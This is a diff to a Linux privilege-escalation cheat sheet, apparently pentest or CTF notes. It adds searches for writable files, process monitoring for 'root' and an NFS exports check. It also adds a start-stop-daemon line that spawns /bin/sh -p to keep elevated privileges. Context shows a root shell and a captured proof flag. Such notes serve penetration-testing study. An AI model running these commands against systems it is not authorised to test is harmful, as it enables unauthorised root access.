@@ -105,6 +105,13 @@ find / -perm -o x -type d 2>/dev/null
 
 # World writable and executable folders
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+
+# Find writable files and directories
+find / -type d -writable -user $(whoami) 2>/dev/null
+find / -type d -writable -group groupname 2>/dev/null
+
+find / -type f -writable -user $(whoami) 2>/dev/null
+find / -type f -writable -group groupname 2>/dev/null
 ```
 
 Look for the link between crons, their paths, and whether you can write to their path. If you can, it's game over. 
@@ -206,7 +213,7 @@ System daemons are Linux services that are spawned at boot time to perform speci
 We can enumerate all the running processes with the ps command and since it only takes a single snapshot of the active processes, we can refresh it using the watch command. In the following example, we will run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass".
 
 ```bash
-watch -n 1 "ps -aux | grep pass --color=auto"
+watch -n 1 "ps -aux | grep root --color=auto"
 ```
 
 Another more holistic angle we should take into consideration when enumerating for privilege escalation is to verify whether we have rights to capture network traffic.
@@ -417,4 +424,17 @@ uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(ww
 bash-5.0# cd /root
 bash-5.0# cat proof.txt
 d4eda6b5a66a2db06370f1f7d9545deb
+```
+
+#### Start-Stop-Daemon
+
+```bash
+/usr/sbin/start-stop-daemon
+/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p
+```
+
+#### NFS
+
+```bash
+cat /etc/exports
 ```
